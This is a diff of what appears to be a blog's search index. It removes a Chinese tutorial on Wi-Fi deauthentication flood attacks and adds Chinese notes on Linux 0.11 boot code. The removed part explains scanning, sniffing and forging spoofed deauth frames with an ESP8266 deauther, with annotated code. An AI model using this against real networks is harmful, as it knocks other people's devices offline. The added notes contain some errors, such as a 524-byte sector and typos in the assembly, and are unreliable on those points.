@@ -201,55 +201,333 @@
       </categories>
   </entry>
   <entry>
-    <title>无线DOS之取消验证洪水攻击</title>
-    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
+    <title>基础知识</title>
+    <url>/2021/07/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h2 id="什么是操作系统？"><a href="#什么是操作系统？" class="headerlink" title="什么是操作系统？"></a>什么是操作系统？</h2><p>只有计算机硬件的东西叫裸机。</p>
+<p>在计算机硬件和应用之间的一层软件就是操作系统。</p>
+<ul>
+<li>方便我们使用硬件</li>
+<li>高效的使用硬件</li>
+</ul>
+<p>操作系统管理这些硬件</p>
+<ul>
+<li><strong>CPU管理</strong></li>
+<li><strong>内存管理</strong></li>
+<li><strong>终端管理</strong></li>
+<li><strong>磁盘管理</strong></li>
+<li><strong>文件管理</strong></li>
+<li>网络管理</li>
+<li>电源管理</li>
+<li>多核管理</li>
+</ul>
+<span id="more"></span>
 
-<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
-<p>简单配置一下</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
-
-<p>烧录</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
-
-<p>这时，esp8266会建立一个WIFI，</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
-
-<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
-
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
-
-<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
-<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
-<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
+<h3 id="学习操作系统可以有很多层次"><a href="#学习操作系统可以有很多层次" class="headerlink" title="学习操作系统可以有很多层次"></a>学习操作系统可以有很多层次</h3><ul>
+<li>从应用软件出发“探到操作系统”<ul>
+<li>集中在使用计算机的接口上</li>
+<li>使用显示器：printf；使用CPU：fork，使用文件：open、read……</li>
+</ul>
+</li>
+<li>从应用软件触发“进入操作系统”<ul>
+<li>一段文字是如何写到磁盘上的…</li>
+</ul>
+</li>
+<li>从硬件触发“设计并实现操作系统”<ul>
+<li>给一个板子，配一个操作系统</li>
+</ul>
+</li>
+</ul>
+<h2 id="揭开钢琴的盖子"><a href="#揭开钢琴的盖子" class="headerlink" title="揭开钢琴的盖子"></a>揭开钢琴的盖子</h2><h3 id="从图灵机到通用图灵机"><a href="#从图灵机到通用图灵机" class="headerlink" title="从图灵机到通用图灵机"></a>从图灵机到通用图灵机</h3><p><img src="1.png"></p>
+<p>图灵机只能做一件事，就像一个只会做一道菜的厨师。</p>
+<p><img src="2.png"></p>
+<p>通用图灵机可以进行编程了，就如同给厨师不同的菜谱可以做出不同的菜。</p>
+<h3 id="从通用图灵机到计算机"><a href="#从通用图灵机到计算机" class="headerlink" title="从通用图灵机到计算机"></a>从通用图灵机到计算机</h3><ul>
+<li>伟大想法的工程实现<ul>
+<li>冯诺依曼存储程序思想（1946年提出）</li>
+<li>主要思想：将程序和数据放在计算机内部的存储器中，计算机在程序控制下一步一步进行处理</li>
+<li>计算机由五大部件组成：输入设备、输出设备、存储器、运算器、控制器。</li>
+</ul>
+</li>
+</ul>
+<h3 id="打开电源，计算机执行的第一条指令是什么？"><a href="#打开电源，计算机执行的第一条指令是什么？" class="headerlink" title="打开电源，计算机执行的第一条指令是什么？"></a>打开电源，计算机执行的第一条指令是什么？</h3><ul>
+<li><p>计算模型=&gt;我们要关注指针IP及其指向的内容</p>
+<ul>
+<li>计算机刚打开电源时，IP=？</li>
+<li>由硬件设计者决定！</li>
+</ul>
+</li>
+<li><p>看x86 PC</p>
 <ol>
-<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
-<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
+<li><p>x86刚开机时CPU处于实模式。</p>
+<p>实模式和保护模式对应，实模式的寻址CS:IP(CS左移4位+IP)，和保护模式不同。</p>
+</li>
+<li><p>开机时，CS=0xFFFF；IP=0x0000</p>
+</li>
+<li><p>寻址0xFFFF0(ROM BIOS映射区)</p>
+</li>
+<li><p>检查RAM，键盘，显示器，软硬磁盘，主板……</p>
+</li>
+<li><p>将磁盘0磁道0扇区（MBR）读入0x7c00处（一个扇区524字节）</p>
+</li>
+<li><p>设置CS=0x07c0,IP=0x0000</p>
+</li>
 </ol>
-<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
-<p>首先是扫描：</p>
-<p>​    AP模式扫描周围的AP。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x7c00处存放的代码"><a href="#0x7c00处存放的代码" class="headerlink" title="0x7c00处存放的代码"></a>0x7c00处存放的代码</h3><ul>
+<li>就是从磁盘引导扇区读入的那512字节<ul>
+<li>引导扇区就是启动设备的第一个扇区（开机时按住del健可进入启动设备设置界面，可以设置为光盘启动）</li>
+<li>启动设备信息被设置在CMOS中…（CMOS：互补金属氧化物半导体。用来存储时钟和硬件配置信息）</li>
+<li>因此，硬盘的第一个扇区上存放着开机后执行的第一段我们可以控制的程序</li>
+<li>操作系统的故事从这里开始</li>
+</ul>
+</li>
+</ul>
+<h3 id="引导扇区代码：bootsect-s"><a href="#引导扇区代码：bootsect-s" class="headerlink" title="引导扇区代码：bootsect.s"></a>引导扇区代码：bootsect.s</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.globl begtext,begdata,begbss,endtext,enddata,endbss</span><br><span class="line">.text	//文本段</span><br><span class="line">begtext:</span><br><span class="line">.data	//数据段</span><br><span class="line">begdata:</span><br><span class="line">.bss	//为初始化数据段</span><br><span class="line">begbss:</span><br><span class="line">entry start	//关键字entry告诉链接器“程序入口”</span><br><span class="line">start:</span><br><span class="line">	mov ax.#BOOTSEG</span><br><span class="line">	//0x07c0,启动代码所在位置放入ax</span><br><span class="line">	mov ds,ax</span><br><span class="line">	//将启动代码与ds寄存器关联</span><br><span class="line">	mov ax.#INITSEG</span><br><span class="line">	//启动代码要被复制到的目的地址</span><br><span class="line">	mov es,ax</span><br><span class="line">	//将目的地址与es寄存器关联</span><br><span class="line">	mov cx,#256</span><br><span class="line">	</span><br><span class="line">	sub si,si</span><br><span class="line">	sub di,di</span><br><span class="line">	//si清零,ds:si即0x07c00</span><br><span class="line">	//di清零,es:di即0x90000</span><br><span class="line">	rep</span><br><span class="line">	//循环移动cx（256）个字,512字节</span><br><span class="line">	//将0x07c0 : 0x0000处的256个字移到0x9000 : 0x0000处</span><br><span class="line">	movw</span><br><span class="line">	jmpi go,INITSEG	//CS=INITSEG	IP=go</span><br><span class="line">	//jmpi 段间跳转</span><br><span class="line">/*</span><br><span class="line">SETUPLEN = 4	nomber of setup-sectors</span><br><span class="line">BOOTSEG  = 0x07c0	original address of boot-sector</span><br><span class="line">INITSEG  = 0x9000	we move boot here - out of the way</span><br><span class="line">SETUPSEG = 0x9020	setup starts here</span><br><span class="line">SYSSEG   = 0x1000	system loaded at 0x10000 (65536).</span><br><span class="line">ENDSEG   = SYSSEG + SYSSIZE	where to stop loading</span><br><span class="line">*/</span><br><span class="line">//由于启动代码复制到了新位置，需要更改相应寄存器的值</span><br><span class="line">go:	mov ax,cs	</span><br><span class="line">	//cs=0x9000</span><br><span class="line">	mov ds,ax </span><br><span class="line">	mov	es,ax</span><br><span class="line">	mov ss,ax</span><br><span class="line">	//开始引入栈</span><br><span class="line">	mov sp,#0xff00</span><br><span class="line">	//为call做准备，栈空间为0x9ff00</span><br><span class="line">//开始加载setup块</span><br><span class="line">load_setup:	//载入setup模块</span><br><span class="line">	mov	dx,#0x0000</span><br><span class="line">	//设置驱动器和磁头(drive 0, head 0): 软盘 0 磁头 </span><br><span class="line">	mov cx,#0x0002</span><br><span class="line">	//设置扇区号和磁道(sector 2, track 0): 0 磁头、0 磁道、2 扇区</span><br><span class="line">	mov bx,#0x0200</span><br><span class="line">	//设置读入的内存地址：BOOTSEG+address = 512，偏移512字节</span><br><span class="line">	mov ax,#0x0200+SETUPLEN</span><br><span class="line">	//SETUPLEN是读入的扇区个数，Linux 0.11 设置的是 4</span><br><span class="line">	int 0x13	</span><br><span class="line">	//BIOS中断,将setup.s对应的程序加载至内存指定地址</span><br><span class="line">	jnc ok_load_setup</span><br><span class="line">	//cf标志寄存器为0就跳转至ok_load_setup块   </span><br><span class="line">	mov dx,#0x0000</span><br><span class="line">	mov ax,#0x0000</span><br><span class="line">	int 0x13</span><br><span class="line">	//复位,cf!=０则重新设置传入信息,进入中断 </span><br><span class="line">	j	load_setup	//重读</span><br></pre></td></tr></table></figure>
 
-<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="3.png"></p>
+<ul>
+<li>0x13是BIOS读磁盘扇区的中断：<ul>
+<li>ah=0x02    读磁盘</li>
+<li>al=扇区数量（SETUPLEN=4）</li>
+<li>ch=柱面号</li>
+<li>cl=开始扇区（0x02，第二个扇区，因为第一个扇区boot扇区）</li>
+<li>dh=磁头号</li>
+<li>dl=驱动器号</li>
+<li>es（0x9000）:bx（0x0200）=内存地址(0x90200)</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ok_load_setup:	//载入setup模块</span><br><span class="line">	mov dl,#0x00</span><br><span class="line">	mov ax,#0x0800</span><br><span class="line">	//ah=0x08获得磁盘参数</span><br><span class="line">	int 0x13</span><br><span class="line">	mov ch，#0x00</span><br><span class="line">	mov sectors，cx</span><br><span class="line">	//保存每磁道扇区数</span><br><span class="line">	mov ah，#0x03</span><br><span class="line">	//读光标位置</span><br><span class="line">	xor bh,bh</span><br><span class="line">	int 0x10</span><br><span class="line">	mov cx,#24</span><br><span class="line">	//要显示24个字符</span><br><span class="line">	mov bx,#0x0007</span><br><span class="line">	//7是显示属性</span><br><span class="line">	</span><br><span class="line">	mov bp，#msg1</span><br><span class="line">	mov ax，#1301</span><br><span class="line">	int 0x10	//显示字符</span><br><span class="line">	//将msg1的字符显示到光标位置</span><br><span class="line">	/*</span><br><span class="line">	bootsect.s中的数据，在文件末尾</span><br><span class="line">	.sectors: .word 0	//磁道扇区数</span><br><span class="line">	msg1:.byte 13,10</span><br><span class="line">		 .ascii &quot;Loading system...&quot;</span><br><span class="line">		 .byte 13,10,13,10</span><br><span class="line">	*/</span><br><span class="line">	mov    ax,#SYSSEG    </span><br><span class="line">	//内核代码被加载到的地址</span><br><span class="line">	mov es,ax</span><br><span class="line">	call read_it	//读入system模块</span><br><span class="line">	jumpi 0，SETUPSEG</span><br><span class="line">	//转入0x9020 : 0x0000执行setup.s</span><br><span class="line">read_it:</span><br><span class="line">	mov ax,es</span><br><span class="line">	cmp ax,#ENDSEG</span><br><span class="line">	//system模块很大，要跨越磁道！</span><br><span class="line">	//ENDSEG=SYSSEG+SYSSIZE</span><br><span class="line">	//SYSSIZE=0x8000(该变量可根据Image大小设定)</span><br><span class="line">	jb ok1_read</span><br><span class="line">	ret</span><br><span class="line">ok1_read:</span><br><span class="line">	mov ax,sectors</span><br><span class="line">	sub ax,sread	//sread是当前磁道已读扇区数，ax未读扇区数</span><br><span class="line">	call read_track	//读磁道...</span><br></pre></td></tr></table></figure>
 
-<p>进入嗅探模式：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果小于0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>引导扇区的末尾//BIOS用以识别引导扇区</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.org 510</span><br><span class="line">	.word 0xAA55 //扇区的最后两个字节</span><br></pre></td></tr></table></figure>
 
-<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
+<p>可以转入setup执行了，jmpi 0，SETUPSEG</p>
+<h2 id="操作系统启动"><a href="#操作系统启动" class="headerlink" title="操作系统启动"></a>操作系统启动</h2><h3 id="setup模块，即setup-s"><a href="#setup模块，即setup-s" class="headerlink" title="setup模块，即setup.s"></a>setup模块，即setup.s</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">	mov ax,#INITSEG</span><br><span class="line">	mov ds,ax</span><br><span class="line">	mov ah,#0x03</span><br><span class="line">	//获取光标位置</span><br><span class="line">	xor bh,bh</span><br><span class="line">	//bh=页号=0（输入）</span><br><span class="line">	int 0x10</span><br><span class="line">	//输出： DH=行号，DL=列号</span><br><span class="line">	mov [0],dx</span><br><span class="line">	mov ah,#0x88</span><br><span class="line">	int 0x15</span><br><span class="line">	//获取内存大小</span><br><span class="line">	mov [2],ax</span><br><span class="line">	cli	//不允许中断</span><br><span class="line">	mov ah,#0x0000</span><br><span class="line">	//保存光标的行号和列号到 0x90000，共占2字节</span><br><span class="line">	cld</span><br><span class="line">do_move:</span><br><span class="line">	mov es,ax</span><br><span class="line">	add ax,#0x1000</span><br><span class="line">	cmp ax,#0x9000</span><br><span class="line">	jz	end_move</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	sub	di,di</span><br><span class="line">	sub si,si</span><br><span class="line">	mov	cx,#0x8000</span><br><span class="line">	rep</span><br><span class="line">	movsw</span><br><span class="line">	jmp	do_move</span><br></pre></td></tr></table></figure>
 
-<p>以上是我们需要构造的mac帧头格式</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
+<p><img src="4.png"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">do_move的C翻译:</span><br><span class="line"></span><br><span class="line">ax = <span class="number">0</span>;</span><br><span class="line">cld;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    es = ax;</span><br><span class="line">    ax += <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">if</span>(ax == <span class="number">0x9000</span>)</span><br><span class="line">        <span class="keyword">break</span>;  <span class="comment">//结束移动</span></span><br><span class="line">    ds = ax;</span><br><span class="line">    di = si = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x8000</span>; ++i)&#123;</span><br><span class="line">       <span class="built_in">memcpy</span>(es:di, ds:si, <span class="number">2</span>);</span><br><span class="line">       di += <span class="number">2</span>;</span><br><span class="line">       si += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="保护模式下的地址翻译和中断处理"><a href="#保护模式下的地址翻译和中断处理" class="headerlink" title="保护模式下的地址翻译和中断处理"></a>保护模式下的地址翻译和中断处理</h3><ul>
+<li><p>保护模式下的地址翻译</p>
+<p>即gdt（全局描述符表）的作用：</p>
+<p>t是table，所以实模式下:cs左移4+ip。保护模式下：根据cs查表+ip。cs这里被称为选择子。</p>
+<p><img src="5.png"></p>
+</li>
+<li><p>保护模式下中断函数入口</p>
+<p>即idt（中断描述符表）的作用：</p>
+<p>t是table，仿照gdt，通过int n的n进行查表</p>
+</li>
+</ul>
+<p><img src="6.png"></p>
+<h3 id="将setup移到0地址处"><a href="#将setup移到0地址处" class="headerlink" title="将setup移到0地址处"></a>将setup移到0地址处</h3><ul>
+<li>但0地址处是有重要内容的<ul>
+<li>此处存储的是中断向量表</li>
+</ul>
+</li>
+<li>以后不调用int指令了吗？</li>
+<li>因为操作系统要让硬件进入保护模式了</li>
+<li>保护模式下int n和cs：ip的解释不再和实模式一样</li>
+</ul>
+<p>我们需要初始化这些表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">end_move:</span><br><span class="line">	mov ax,#SETUPSEG</span><br><span class="line">	mov ds,ax</span><br><span class="line">	lidt idt_48</span><br><span class="line">	lgdt gdt_48</span><br><span class="line">	//设置保护模式下的中断和寻址</span><br><span class="line">idt_48:</span><br><span class="line">	.word 0</span><br><span class="line">	.word 0,0	//保护模式中断函数表</span><br><span class="line">gdt_48:</span><br><span class="line">	.word 0x800</span><br><span class="line">	.word 512+gdt,0x9</span><br><span class="line">gdt:</span><br><span class="line">	.word 0,0,0,0</span><br><span class="line">	.word 0x07FF,0x0000,9x9A00,0x00C0</span><br><span class="line">	.word 0x07FF,0x0000,9x9200,0x00C0</span><br></pre></td></tr></table></figure>
 
+<h3 id="进入保护模式"><a href="#进入保护模式" class="headerlink" title="进入保护模式"></a>进入保护模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	call empty_8042</span><br><span class="line">//8042是键盘控制器，</span><br><span class="line">	mov	al,#0xD1</span><br><span class="line">	out #0x64,al</span><br><span class="line">	call empty_8042</span><br><span class="line">	mov al,#0xDF</span><br><span class="line">	out #0x60,al</span><br><span class="line">	call empty_8042</span><br><span class="line">	mov ax,#0x0001</span><br><span class="line">	mov cr0,ax</span><br><span class="line">	//cr0寄存器中PE=1启动保护模式，PG=1启动分页</span><br><span class="line">	jmpi 0,8</span><br></pre></td></tr></table></figure>
+
+<p><img src="7.png"></p>
+<p><img src="8.png"></p>
+<p><img src="9.png"></p>
+<h3 id="跳到system模块执行"><a href="#跳到system模块执行" class="headerlink" title="跳到system模块执行"></a>跳到system模块执行</h3><p>system模块（目标代码）中的第一部分代码：head.s</p>
